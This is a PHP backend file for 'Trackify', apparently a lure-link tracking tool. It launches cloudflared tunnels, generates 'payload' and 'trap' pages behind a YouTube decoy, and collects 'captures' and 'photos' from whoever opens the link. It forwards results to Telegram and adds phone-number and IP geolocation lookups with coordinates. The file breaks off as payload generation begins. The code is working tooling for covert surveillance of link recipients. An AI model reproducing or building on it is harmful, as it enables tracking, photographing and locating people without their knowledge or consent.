<?php
/**
 * Trackify Dashboard API
 * Handles link generation, captures, and status
 */

declare(strict_types=1);

require_once __DIR__ . '/access.php';
trackify_enforce_ip_whitelist($_SERVER, true);

$action = $_GET['action'] ?? '';
$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'telegram_config', 'telegram_test', 'update_payload', 'diag', 'phone_lookup', 'phone_history', 'ip_lookup'];

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    exit;
}

if (in_array($action, $authActions, true)) {
    require_once __DIR__ . '/bootstrap.php';
    if (empty($_SESSION['user_id'])) {
        header('Content-Type: application/json');
        header('Access-Control-Allow-Origin: *');
        echo json_encode(['status' => 'error', 'message' => 'Authentication required']);
        exit;
    }
}

header('Content-Type: application/json');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

$_root = realpath(__DIR__);
$baseDir = $_root !== false ? $_root : __DIR__;
chdir($baseDir);

require_once $baseDir . '/trackify_capture.php';

switch ($action) {
    case 'start':
        handleStart();
        break;
    case 'stop':
        handleStop();
        break;
    case 'link':
        handleLink();
        break;
    case 'captures':
        handleCaptures();
        break;
    case 'photos':
        handlePhotos();
        break;
    case 'delete_photos':
        handleDeletePhotos();
        break;
    case 'clear_captures':
        handleClearCaptures();
        break;
    case 'status':
        handleStatus();
        break;
    case 'terminal':
        handleTerminal();
        break;
    case 'telegram':
        handleTelegram();
        break;
    case 'telegram_config':
        handleTelegramConfig();
        break;
    case 'telegram_test':
        handleTelegramTest();
        break;
    case 'update_payload':
        handleUpdatePayload();
        break;
    case 'diag':
        handleDiag();
        break;
    case 'phone_lookup':
        handlePhoneLookup();
        break;
    case 'phone_history':
        handlePhoneHistory();
        break;
    case 'ip_lookup':
        handleIpLookup();
        break;
    default:
        echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
}

function dashboard_session_user_id(): int
{
    return (int) ($_SESSION['user_id'] ?? 0);
}

function read_dashboard_config(string $baseDir): array
{
    $defaults = [
        'template' => '2',
        'yt_video_id' => 'dQw4w9WgXcQ',
        'tracker_token' => '',
        'user_id' => 0,
    ];
    $path = $baseDir . '/dashboard_config.json';
    if (!file_exists($path)) {
        return $defaults;
    }
    $merged = array_merge($defaults, json_decode(file_get_contents($path), true) ?: []);
    return $merged;
}

function config_owned_by_session(array $config): bool
{
    return !empty($config['user_id'])
        && (int) $config['user_id'] === dashboard_session_user_id();
}

function normalize_template_id($value): int
{
    $t = (int) $value;
    if ($t < 1 || $t > 7) {
        return 2;
    }
    return $t;
}

/**
 * URL cloudflared forwards to. Default assumes `php -S 127.0.0.1:8000` from project root.
 * Laragon / Apache: set tunnel_origin in config.php (project root), e.g. http://trackify.test
 */
function tunnel_origin_url(): string
{
    $path = __DIR__ . '/config.php';
    if (!is_readable($path)) {
        return 'http://127.0.0.1:8000';
    }
    $cfg = require $path;
    $raw = $cfg['tunnel_origin'] ?? '';
    if (is_string($raw)) {
        $u = trim($raw);
        if ($u !== '' && preg_match('#^https?://#i', $u)) {
            return $u;
        }
    }
    return 'http://127.0.0.1:8000';
}

/**
 * Resolve SerpAPI key from config.php or environment.
 *
 * @return string|null non-empty when configured
 */
function serpapi_api_key(): ?string
{
    $path = __DIR__ . '/config.php';
    if (is_readable($path)) {
        $cfg = require $path;
        if (!empty($cfg['serpapi_key']) && is_string($cfg['serpapi_key'])) {
            return trim($cfg['serpapi_key']) ?: null;
        }
    }
    $env = getenv('SERPAPI_API_KEY');
    if (is_string($env) && trim($env) !== '') {
        return trim($env);
    }

    return null;
}

/**
 * FindIP.net API token (https://findip.net/).
 *
 * @return string|null non-empty when configured
 */
function findip_api_token(): ?string
{
    $path = __DIR__ . '/config.php';
    if (is_readable($path)) {
        $cfg = require $path;
        if (!empty($cfg['findip_token']) && is_string($cfg['findip_token'])) {
            $t = trim($cfg['findip_token']);
            if ($t !== '') {
                return $t;
            }
        }
    }
    $env = getenv('FINDIP_TOKEN');
    if (is_string($env) && trim($env) !== '') {
        return trim($env);
    }

    return null;
}

/** @return non-empty-string */
function findip_api_base_url(): string
{
    $path = __DIR__ . '/config.php';
    $default = 'https://api.findip.net';
    if (!is_readable($path)) {
        return $default;
    }
    $cfg = require $path;
    $base = $cfg['findip_api_base'] ?? $default;
    if (!is_string($base) || trim($base) === '') {
        return $default;
    }
    $base = rtrim(trim($base), '/');

    return preg_match('#^https?://#i', $base) ? $base : $default;
}

function findip_is_list_array(array $arr): bool
{
    if (function_exists('array_is_list')) {
        return array_is_list($arr);
    }
    $i = 0;
    foreach ($arr as $k => $_) {
        if ($k !== $i) {
            return false;
        }
        $i++;
    }

    return true;
}

/**
 * True when a merged value is useless so a richer sibling (e.g. under "data") should win.
 */
function findip_is_emptyish(mixed $v): bool
{
    if ($v === null) {
        return true;
    }
    if (is_string($v)) {
        return trim($v) === '';
    }
    if (is_array($v)) {
        if ($v === []) {
            return true;
        }
        if (findip_is_list_array($v)) {
            return $v === [];
        }

        return count($v) === 0;
    }

    return false;
}

/**
 * Flatten FindIP JSON: merge common wrappers and nested objects so scalar picks work.
 *
 * @return array<string, mixed>
 */
function findip_flatten_payload(array $json): array
{
    $flat = [];

    $mergeKey = function (string $k, mixed $v) use (&$flat): void {
        if (!array_key_exists($k, $flat)) {
            $flat[$k] = $v;

            return;
        }
        if (findip_is_emptyish($flat[$k]) && !findip_is_emptyish($v)) {
            $flat[$k] = $v;
        }
    };

    $mergeLevel = function (array $node) use (&$flat, $mergeKey): void {
        foreach ($node as $k => $v) {
            if (!is_string($k)) {
                continue;
            }
            $mergeKey($k, $v);
            if (is_array($v) && !findip_is_list_array($v)) {
                foreach ($v as $nk => $nv) {
                    if (!is_string($nk)) {
                        continue;
                    }
                    $mergeKey($nk, $nv);
                    $mergeKey($k . '_' . $nk, $nv);
                }
            }
        }
    };

    // Merge nested payloads first so empty top-level placeholders (country: "") do not block "data".
    foreach (['data', 'result', 'payload', 'response', 'location', 'ip'] as $rootKey) {
        if (isset($json[$rootKey]) && is_array($json[$rootKey])) {
            $mergeLevel($json[$rootKey]);
        }
    }
    $mergeLevel($json);

    // Unwrap typical nested objects (country/city/isp as { name, iso, ... })
    $parents = [
        'country', 'city', 'region', 'state', 'province', 'isp', 'organization', 'org',
        'connection', 'location', 'address', 'subdivision', 'sub_division', 'continent',
        'geo', 'geolocation', 'network', 'traits',
    ];
    foreach ($parents as $p) {
        if (!isset($flat[$p]) || !is_array($flat[$p]) || findip_is_list_array($flat[$p])) {
            continue;
        }
        foreach ($flat[$p] as $nk => $nv) {
            if (!is_string($nk)) {
                continue;
            }
            $ck = $p . '_' . $nk;
            $mergeKey($ck, $nv);
        }
    }

    return $flat;
}

/**
 * Turn API value into display string (scalars or { name, iso, ... } objects).
 */
function findip_stringify_value(mixed $v): ?string
{
    if ($v === null) {
        return null;
    }
    if (is_bool($v) || is_float($v) || is_int($v)) {
        return findip_format_scalar($v);
    }
    if (is_string($v)) {
        $t = trim($v);

        return $t === '' ? null : $t;
    }
    if (is_array($v) && !findip_is_list_array($v)) {
        foreach (['name', 'Name', 'long_name', 'country_name', 'city', 'title', 'label', 'value', 'organization', 'org'] as $nk) {
            if (!isset($v[$nk])) {
                continue;
            }
            $inner = findip_stringify_value($v[$nk]);
            if ($inner !== null && $inner !== '') {
                return $inner;
            }
        }
        if (isset($v['names']) && is_array($v['names']) && !findip_is_list_array($v['names'])) {
            foreach (['en', 'EN', 'english', 'de', 'es', 'fr', 'ja', 'zh-CN'] as $lang) {
                if (!isset($v['names'][$lang]) || !is_string($v['names'][$lang])) {
                    continue;
                }
                $t = trim($v['names'][$lang]);
                if ($t !== '') {
                    return $t;
                }
            }
            foreach ($v['names'] as $nv) {
                if (!is_string($nv)) {
                    continue;
                }
                $t = trim($nv);
                if ($t !== '') {
                    return $t;
                }
            }
        }
        if (isset($v['iso']) && is_scalar($v['iso']) && trim((string) $v['iso']) !== '') {
            return trim((string) $v['iso']);
        }
        if (isset($v['code']) && is_scalar($v['code']) && trim((string) $v['code']) !== '') {
            return trim((string) $v['code']);
        }
    }

    return null;
}

/**
 * @param array<string, mixed> $data
 */
function findip_pick_string(array $data, array $keys): ?string
{
    foreach ($keys as $k) {
        if (!array_key_exists($k, $data)) {
            continue;
        }
        $s = findip_stringify_value($data[$k]);
        if ($s !== null && $s !== '') {
            return $s;
        }
    }

    return null;
}

/**
 * @param array<string, mixed> $data
 */
function findip_pick_float(array $data, array $keys): ?float
{
    foreach ($keys as $k) {
        if (!array_key_exists($k, $data)) {
            continue;
        }
        $v = $data[$k];
        if ($v === null || $v === '') {
            continue;
        }
        if (is_numeric($v)) {
            return (float) $v;
        }
    }

    return null;
}

/**
 * @param array<string, mixed> $data
 */
function findip_pick_iso2_alpha2(array $data): ?string
{
    $keys = [
        'country_iso2', 'countryIso2', 'country_code', 'countryCode', 'CountryCode',
        'iso_code', 'isoCode', 'country_code_iso2', 'ISO_CODE',
    ];
    foreach ($keys as $k) {
        if (!array_key_exists($k, $data)) {
            continue;
        }
        $v = $data[$k];
        if (!is_string($v) && !is_int($v)) {
            continue;
        }
        $s = strtoupper(trim((string) $v));
        if (strlen($s) === 2 && ctype_alpha($s)) {
            return $s;
        }
    }

    return null;
}

function findip_is_eu_member_iso2(string $iso2): bool
{
    static $eu = null;
    if ($eu === null) {
        $eu = array_flip([
            'AT', 'BE', 'BG', 'HR', 'CY', 'CZ', 'DK', 'EE', 'FI', 'FR', 'DE', 'GR',
            'HU', 'IE', 'IT', 'LV', 'LT', 'LU', 'MT', 'NL', 'PL', 'PT', 'RO', 'SK',
            'SI', 'ES', 'SE',
        ]);
    }

    return isset($eu[strtoupper($iso2)]);
}

function findip_continent_name_from_code(string $code): ?string
{
    $c = strtoupper(trim($code));
    $map = [
        'AF' => 'Africa',
        'AN' => 'Antarctica',
        'AS' => 'Asia',
        'EU' => 'Europe',
        'NA' => 'North America',
        'OC' => 'Oceania',
        'SA' => 'South America',
    ];

    return $map[$c] ?? null;
}

/**
 * Region / state / province (FindIP and MaxMind-style subdivisions array).
 *
 * @param array<string, mixed> $data
 */
function findip_pick_subdivision(array $data): ?string
{
    $direct = findip_pick_string($data, [
        'sub_division', 'subdivision', 'SubDivision', 'subdivision_name', 'subdivisionName',
        'region', 'regionName', 'region_name', 'regionNameEn', 'region_name_en',
        'state', 'State', 'province', 'administrative_area', 'administrative_area_level_1',
        'admin_level_1', 'state_province', 'StateProvince', 'principal_subdivision',
        'most_specific_subdivision', 'first_subdivision', 'subdivision_1', 'subdivision1',
        'location_region', 'address_region', 'geo_region', 'metro', 'metro_name',
    ]);
    if ($direct !== null) {
        return $direct;
    }
    foreach (['subdivisions', 'Subdivisions'] as $sk) {
        if (!isset($data[$sk]) || !is_array($data[$sk])) {
            continue;
        }
        $arr = $data[$sk];
        if (!findip_is_list_array($arr) || $arr === []) {
            continue;
        }
        $first = $arr[0];
        $s = findip_stringify_value($first);
        if ($s !== null && $s !== '') {
            return $s;
        }
    }

    return null;
}

/**
 * Format a scalar for display (FindIP-style booleans as True/False).
 */
function findip_format_scalar(mixed $v): ?string
{
    if ($v === null) {
        return null;
    }
    if (is_bool($v)) {
        return $v ? 'True' : 'False';
    }
    if (is_float($v) || is_int($v)) {
        return (string) $v;
    }
    if (is_string($v)) {
        $t = trim($v);

        return $t === '' ? null : $t;
    }

    return null;
}

/**
 * Normalize FindIP JSON: coordinates + two-column rows (same layout as findip.net UI).
 *
 * @param array<string, mixed> $json
 * @return array{details_rows: list<array{left: array{label: string, value: string}, right: array{label: string, value: string}}>, details_extra: list<array{label: string, value: string}>, details: array<string, string>, lat: ?float, lon: ?float}
 */
function findip_normalize_for_ui(array $json, string $queriedIp = ''): array
{
    $data = findip_flatten_payload($json);

    $lat = findip_pick_float($data, [
        'latitude', 'lat', 'Latitude', 'location_latitude', 'geo_latitude', 'lat_dd',
    ]);
    $lon = findip_pick_float($data, [
        'longitude', 'lon', 'lng', 'Longitude', 'location_longitude', 'geo_longitude', 'lon_dd',
    ]);

    if (($lat === null || $lon === null) && isset($data['loc']) && is_string($data['loc'])) {
        $parts = array_map('trim', explode(',', $data['loc']));
        if (count($parts) === 2 && is_numeric($parts[0]) && is_numeric($parts[1])) {
            $lat = (float) $parts[0];
            $lon = (float) $parts[1];
        }
    }

    $cell = function (array $keys) use ($data): string {
        $picked = findip_pick_string($data, $keys);
        if ($picked !== null && $picked !== '') {
            return $picked;
        }

        return '—';
    };

    $isEuVal = null;
    foreach ([
        'is_eu', 'isEu', 'eu', 'EU', 'in_european_union', 'is_in_european_union',
        'is_european_union', 'EuropeanUnion', 'european_union', 'isEuMember', 'is_eu_member',
    ] as $k) {
        if (!array_key_exists($k, $data)) {
            continue;
        }
        $v = $data[$k];
        if (is_bool($v)) {
            $isEuVal = $v ? 'True' : 'False';
            break;
        }
        if ($v === '1' || $v === 1 || $v === 'true' || $v === 'True') {
            $isEuVal = 'True';
            break;
        }
        if ($v === '0' || $v === 0 || $v === 'false' || $v === 'False') {
            $isEuVal = 'False';
            break;
        }
        $s = findip_stringify_value($v);
        if ($s !== null && $s !== '') {
            $isEuVal = $s;
            break;
        }
    }
    if ($isEuVal === null || $isEuVal === '—') {
        $iso2eu = findip_pick_iso2_alpha2($data);
        if ($iso2eu !== null) {
            $isEuVal = findip_is_eu_member_iso2($iso2eu) ? 'True' : 'False';
        } else {
            $isEuVal = '—';
        }
    }

    $continentCodeForName = findip_pick_string($data, [
        'continent_code', 'continentCode', 'continent_code_iso2', 'continentCodeIso2',
    ]);
    $continentNameVal = $cell([
        'continent_name', 'continentName', 'continent_name_long', 'continent_full_name',
        'continent_name_en', 'continent', 'location_continent', 'traits_continent',
    ]);
    if ($continentNameVal === '—' && $continentCodeForName !== null) {
        $mapped = findip_continent_name_from_code($continentCodeForName);
        if ($mapped !== null) {
            $continentNameVal = $mapped;
        }
    }

    $subDivStr = findip_pick_subdivision($data);
    if ($subDivStr === null || $subDivStr === '') {
        $subDivStr = '—';
    }

    $latStr = $lat !== null ? (string) $lat : '—';
    $lonStr = $lon !== null ? (string) $lon : '—';

    $ipRow = $cell(['ip', 'query', 'ip_address', 'IPAddress', 'IPAddressV4', 'IPAddressV6']);
    if ($ipRow === '—' && $queriedIp !== '') {
        $ipRow = $queriedIp;
    }

    // Left column labels + key lists | Right column (findip.net layout)
    $detailsRows = [
        [
            'left' => ['label' => 'IP Address', 'value' => $ipRow],
            'right' => ['label' => 'Latitude', 'value' => $latStr],
        ],
        [
            'left' => ['label' => 'Country', 'value' => $cell([
                'country', 'country_name', 'Country', 'countryName', 'country_long_name',
                'country_name_en', 'CountryName', 'countryNameEn', 'country_iso', 'country_iso2',
                'country_iso3', 'countryNameNative', 'country_name_native',
                'location_country', 'address_country', 'geo_country', 'registered_country',
                'represented_country',
            ])],
            'right' => ['label' => 'Longitude', 'value' => $lonStr],
        ],
        [
            'left' => ['label' => 'City', 'value' => $cell([
                'city', 'City', 'city_name', 'cityName', 'locality', 'district',
                'location_city', 'address_city', 'geo_city', 'town', 'municipality', 'village',
                'address_locality',
            ])],
            'right' => ['label' => 'ISP', 'value' => $cell([
                'isp', 'ISP', 'organization', 'org', 'as', 'AS', 'asname', 'ASName',
                'isp_name', 'IspName', 'carrier', 'Carrier', 'company', 'Company',
            ])],
        ],
        [
            'left' => ['label' => 'Time Zone', 'value' => $cell(['timezone', 'time_zone', 'TimeZone', 'timeZone', 'timezone_name'])],
            'right' => ['label' => 'Continent Code', 'value' => $cell(['continent_code', 'continentCode', 'continent_code_iso2', 'continentCodeIso2'])],
        ],
        [
            'left' => ['label' => 'Weather Code', 'value' => $cell(['weather_code', 'weatherCode', 'WeatherCode', 'weather'])],
            'right' => ['label' => 'Continent Name', 'value' => $continentNameVal],
        ],
        [
            'left' => ['label' => 'Connection Type', 'value' => $cell([
                'connection_type', 'connectionType', 'connection', 'type', 'usage_type', 'UsageType',
                'connection_type_name', 'network_type', 'NetworkType',
            ])],
            'right' => ['label' => 'Is EU', 'value' => $isEuVal],
        ],
        [
            'left' => ['label' => 'Sub Division', 'value' => $subDivStr],
            'right' => ['label' => 'ISO Code', 'value' => $cell([
                'iso_code', 'country_code', 'countryCode', 'country_code_iso2', 'CountryCode', 'isoCode',
                'country_iso', 'country_iso2', 'countryIso2',
            ])],
        ],
    ];

    // Flat map for map popup
    $details = [];
    foreach ($detailsRows as $row) {
        $details[$row['left']['label']] = $row['left']['value'];
        $details[$row['right']['label']] = $row['right']['value'];
    }

    // Any remaining scalar fields from API (additional detail)
    $usedKeys = [
        'ip', 'query', 'ip_address', 'IPAddress', 'IPAddressV4', 'IPAddressV6',
        'latitude', 'lat', 'Latitude', 'longitude', 'lon', 'lng', 'Longitude', 'loc',
        'country', 'country_name', 'Country', 'countryName',
        'city', 'City', 'city_name',
        'timezone', 'time_zone', 'TimeZone', 'timeZone',
        'weather_code', 'weatherCode', 'WeatherCode', 'weather',
        'connection_type', 'connectionType', 'connection', 'type', 'usage_type', 'UsageType',
        'sub_division', 'subdivision', 'SubDivision', 'region', 'regionName', 'region_name', 'state', 'State', 'province',
        'isp', 'ISP', 'organization', 'org', 'as', 'AS', 'asname', 'ASName',
        'continent_code', 'continentCode', 'continent_code_iso2',
        'continent_name', 'continentName', 'continent',
        'is_eu', 'isEu', 'eu', 'EU',
        'iso_code', 'country_code', 'countryCode', 'isoCode',
        'success', 'message', 'error', 'data', 'result', 'status',
    ];
    $usedKeys = array_flip($usedKeys);

    $detailsExtra = [];
    foreach ($data as $key => $val) {
        if (!is_string($key) || isset($usedKeys[$key])) {
            continue;
        }
        $formatted = findip_format_scalar($val);
        if ($formatted === null) {
            continue;
        }
        $label = ucfirst(str_replace(['_', '-'], ' ', $key));
        if (isset($details[$label])) {
            continue;
        }
        $details[$label] = $formatted;
        $detailsExtra[] = ['label' => $label, 'value' => $formatted];
    }

    return [
        'details_rows' => $detailsRows,
        'details_extra' => $detailsExtra,
        'details' => $details,
        'lat' => $lat,
        'lon' => $lon,
    ];
}

function handleIpLookup(): void
{
    $ip = trim((string) ($_GET['ip'] ?? ''));
    if ($ip === '') {
        echo json_encode(['status' => 'error', 'message' => 'ip required']);
        return;
    }

    if (filter_var($ip, FILTER_VALIDATE_IP) === false) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid IP address']);
        return;
    }

    $token = findip_api_token();
    if ($token === null) {
        echo json_encode([
            'status' => 'error',
            'message' => 'FindIP token not configured. Set findip_token in config.php or FINDIP_TOKEN env (see https://findip.net/).',
        ]);
        return;
    }

    $base = findip_api_base_url();
    $url = $base . '/' . rawurlencode($ip) . '/?token=' . rawurlencode($token);

    $ctx = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 12,
            'ignore_errors' => true,
            'header' => "Accept: application/json\r\n",
        ],
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);

    $raw = @file_get_contents($url, false, $ctx);
    if ($raw === false || $raw === '') {
        echo json_encode(['status' => 'error', 'message' => 'FindIP request failed']);
        return;
    }

    $json = json_decode($raw, true);
    if (!is_array($json)) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON from FindIP']);
        return;
    }

    if (!empty($json['error']) && is_string($json['error'])) {
        echo json_encode(['status' => 'error', 'message' => $json['error']]);
        return;
    }
    if (isset($json['success']) && $json['success'] === false) {
        $msg = $json['message'] ?? $json['error'] ?? 'Lookup failed';
        echo json_encode(['status' => 'error', 'message' => is_string($msg) ? $msg : 'Lookup failed']);
        return;
    }

    $norm = findip_normalize_for_ui($json, $ip);

    echo json_encode([
        'status' => 'success',
        'ip' => $ip,
        'lat' => $norm['lat'],
        'lon' => $norm['lon'],
        'details' => $norm['details'],
        'details_rows' => $norm['details_rows'],
        'details_extra' => $norm['details_extra'],
    ]);
}

/** @return non-empty-string|null */
function resolve_cloudflared_binary(string $baseDir, bool $isWin): ?string
{
    $name = $isWin ? 'cloudflared.exe' : 'cloudflared';
    $local = $baseDir . DIRECTORY_SEPARATOR . $name;
    if (is_file($local)) {
        $rp = realpath($local);

        return ($rp !== false && $rp !== '') ? $rp : $local;
    }
    if ($isWin) {
        $out = [];
        @exec('where cloudflared 2>nul', $out);
        if (!empty($out[0])) {
            $p = trim($out[0]);

            return is_file($p) ? $p : null;
        }
    } else {
        $p = trim((string) shell_exec('command -v cloudflared 2>/dev/null'));
        if ($p !== '' && is_file($p)) {
            return $p;
        }
    }

    return null;
}

function reconcile_dashboard_config_for_session(string $baseDir, array $config): array
{
    if (config_owned_by_session($config)) {
        return $config;
    }
    $sessionUid = dashboard_session_user_id();
    $token = (string) ($config['tracker_token'] ?? '');
    if (strlen($token) < 32) {
        return $config;
    }
    $owner = trackify_user_id_for_token($token);
    if ($owner !== null && $owner === $sessionUid) {
        $config['user_id'] = $sessionUid;
        $path = $baseDir . '/dashboard_config.json';
        @file_put_contents($path, json_encode($config, JSON_PRETTY_PRINT), LOCK_EX);
    }
    return $config;
}

function handleStart(): void
{
    global $baseDir;

    $userId = dashboard_session_user_id();
    $token = trackify_issue_tracker_token($userId);
    if ($token === null) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Could not create tracker token. Run schema.sql (tracker_tokens) and check MySQL.',
        ]);
        return;
    }

    $template = normalize_template_id($_POST['template'] ?? 2);
    $ytVideoId = $_POST['yt_video_id'] ?? 'dQw4w9WgXcQ';
    $telegram = isset($_POST['telegram']) ? (bool) $_POST['telegram'] : false;
    $botToken = $_POST['bot_token'] ?? '';
    $chatId = $_POST['chat_id'] ?? '';

    $cfgPath = $baseDir . '/dashboard_config.json';
    $cfgPayload = json_encode([
        'template' => $template,
        'yt_video_id' => (string) $ytVideoId,
        'tracker_token' => $token,
        'user_id' => $userId,
    ], JSON_PRETTY_PRINT);
    if (@file_put_contents($cfgPath, $cfgPayload, LOCK_EX) === false) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Cannot write dashboard_config.json. Fix permissions on the project root (web user must be able to write this file).',
        ]);
        return;
    }

    if ($telegram && (!empty($botToken) || !empty($chatId))) {
        $config = [
            'bot_token' => $botToken,
            'chat_id' => $chatId,
        ];
        file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT));
    }

    $sendlink = $baseDir . '/sendlink';
    @unlink($sendlink);

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $binary = resolve_cloudflared_binary($baseDir, $isWin);
    if ($binary === null) {
        echo json_encode([
            'status' => 'error',
            'message' => 'cloudflared is not installed or not in PATH. Place cloudflared' . ($isWin ? '.exe' : '') . ' in the project folder, or install from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/',
        ]);

        return;
    }

    $origin = tunnel_origin_url();
    $cmd = escapeshellarg($binary) . ' tunnel --url ' . escapeshellarg($origin);

    if ($isWin) {
        $winBase = str_replace('/', '\\', $baseDir);
        $cd = strpos($winBase, ' ') !== false
            ? 'cd /d "' . str_replace('"', '""', $winBase) . '"'
            : 'cd /d ' . $winBase;
        $fullCmd = 'start /B cmd /c "' . $cd . ' && ' . $cmd . ' > sendlink 2>&1"';
        pclose(popen($fullCmd, 'r'));
    } else {
        if (!function_exists('exec')) {
            echo json_encode([
                'status' => 'error',
                'message' => 'PHP exec() is disabled; cannot start cloudflared. Enable exec in php.ini or run the tunnel manually.',
            ]);

            return;
        }
        exec('cd ' . escapeshellarg($baseDir) . ' && nohup ' . $cmd . ' > sendlink 2>&1 &');
    }

    echo json_encode([
        'status' => 'starting',
        'message' => 'Tunnel starting... Poll /api.php?action=link for the URL',
    ]);
}

function handleStop(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    if (!config_owned_by_session($config)) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Tunnel was started by another account or is not active for you.',
        ]);
        return;
    }

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $stopped = [];

    if ($isWin) {
        @exec('taskkill /F /IM cloudflared.exe 2>nul', $out, $code);
        if ($code === 0) {
            $stopped[] = 'cloudflared';
        }
        @exec('taskkill /F /IM ngrok.exe 2>nul', $out, $code);
        if ($code === 0) {
            $stopped[] = 'ngrok';
        }
    } else {
        @exec('pkill -f cloudflared 2>/dev/null', $out, $code);
        if ($code === 0) {
            $stopped[] = 'cloudflared';
        }
        @exec('pkill -f ngrok 2>/dev/null', $out, $code);
        if ($code === 0) {
            $stopped[] = 'ngrok';
        }
        @exec('killall cloudflared 2>/dev/null', $out, $code);
        @exec('killall ngrok 2>/dev/null', $out, $code);
    }

    $sendlink = $baseDir . '/sendlink';
    if (file_exists($sendlink)) {
        @unlink($sendlink);
    }

    echo json_encode([
        'status' => 'success',
        'message' => 'Tunnel stopped',
        'stopped' => $stopped,
    ]);
}

function extract_trycloudflare_url(string $sendlinkFile): ?string
{
    if (!file_exists($sendlinkFile) || filesize($sendlinkFile) === 0) {
        return null;
    }
    $content = (string) file_get_contents($sendlinkFile);
    // cloudflared may write ANSI escapes even when redirected
    $plain = preg_replace('/\x1b\[[0-9;]*[A-Za-z]|\x1b\]8;[^\x07]*\x07|\x1b\][0-9;]*\x07/', '', $content) ?? $content;
    // Quick tunnel hostnames: word chars and hyphens; allow nested labels if CF changes format
    if (preg_match('#https://[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.trycloudflare\.com#i', $plain, $m)) {
        return rtrim($m[0], '.,);]\'"');
    }
    if (preg_match('#https://[^\s<>"\']+\.trycloudflare\.com#i', $plain, $m)) {
        return rtrim($m[0], '.,);]\'"');
    }

    return null;
}

/** Short safe snippet from sendlink for UI when tunnel URL is missing */
function tunnel_sendlink_excerpt(string $sendlinkFile, int $maxLen = 320): ?string
{
    if (!file_exists($sendlinkFile) || filesize($sendlinkFile) === 0) {
        return null;
    }
    $raw = (string) file_get_contents($sendlinkFile);
    $raw = preg_replace('/\x1b\[[0-9;]*[A-Za-z]/', '', $raw) ?? $raw;
    $one = preg_replace('/\s+/', ' ', trim($raw));

    return $one === '' ? null : substr($one, 0, $maxLen);
}

function handleLink(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    if (!config_owned_by_session($config)) {
        echo json_encode([
            'status' => 'forbidden',
            'link' => null,
            'message' => 'No active tunnel run for your account. Click Generate Link again. If this persists, ensure dashboard_config.json is writable and MySQL has the tracker_tokens table (see schema.sql).',
        ]);
        return;
    }

    $token = (string) ($config['tracker_token'] ?? '');
    if (strlen($token) < 32) {
        echo json_encode(['status' => 'error', 'link' => null, 'message' => 'Missing tracker token; generate again.']);
        return;
    }

    $sendlink = $baseDir . '/sendlink';
    $link = extract_trycloudflare_url($sendlink);

    $payloadOk = true;
    $builtTemplate = null;
    $payloadStamp = null;
    $trapFile = null;
    if ($link !== null) {
        $tpl = normalize_template_id($config['template'] ?? 2);
        $yt = (string) ($config['yt_video_id'] ?? 'dQw4w9WgXcQ');
        $gen = generatePayload($link, $tpl, $yt, $token);
        $payloadOk = $gen['ok'];
        $builtTemplate = $gen['template_id'];
        $payloadStamp = $gen['stamp'];
        $trapFile = $gen['trap_file'] ?? null;
    }

    $excerpt = ($link === null) ? tunnel_sendlink_excerpt($sendlink) : null;

    echo json_encode([
        'status' => $link ? 'ready' : 'starting',
        'link' => $link,
        'payload_ok' => $payloadOk,
        'template_id' => $builtTemplate,
        'payload_stamp' => $payloadStamp,
        'trap_file' => $trapFile,
        'tunnel_log_excerpt' => $excerpt,
    ]);
}

function handleUpdatePayload(): void
{
    global $baseDir;

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);
        return;
    }

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    if (!config_owned_by_session($config)) {
        echo json_encode(['status' => 'error', 'message' => 'No active session config for your account. Generate a link first.']);
        return;
    }

    $token = (string) ($config['tracker_token'] ?? '');
    if (strlen($token) < 32) {
        echo json_encode(['status' => 'error', 'message' => 'Missing tracker token; generate again.']);
        return;
    }

    $tpl = normalize_template_id($_POST['template'] ?? $config['template'] ?? 2);
    $yt = (string) ($_POST['yt_video_id'] ?? $config['yt_video_id'] ?? 'dQw4w9WgXcQ');

    $config['template'] = $tpl;
    $config['yt_video_id'] = $yt;

    $cfgPath = $baseDir . '/dashboard_config.json';
    if (@file_put_contents($cfgPath, json_encode($config, JSON_PRETTY_PRINT), LOCK_EX) === false) {
        echo json_encode(['status' => 'error', 'message' => 'Cannot save dashboard_config.json']);
        return;
    }

    $sendlink = $baseDir . '/sendlink';
    $link = extract_trycloudflare_url($sendlink);
    $payloadOk = true;
    $genStamp = null;
    $trapFile = null;
    if ($link !== null) {
        $gen = generatePayload($link, $tpl, $yt, $token);
        $payloadOk = $gen['ok'];
        $genStamp = $gen['stamp'];
        $trapFile = $gen['trap_file'] ?? null;
    }

    echo json_encode([
        'status' => 'success',
        'template' => $tpl,
        'regenerated' => $link !== null,
        'payload_ok' => $payloadOk,
        'payload_stamp' => $genStamp,
        'trap_file' => $trapFile,
    ]);
}

/**
 * @return array{ok: bool, template_id: int, stamp: string, trap_file: string}
 */
function generatePayload(string $link, $template, $ytVideoId, string $trackerToken): array
{
    global $baseDir;

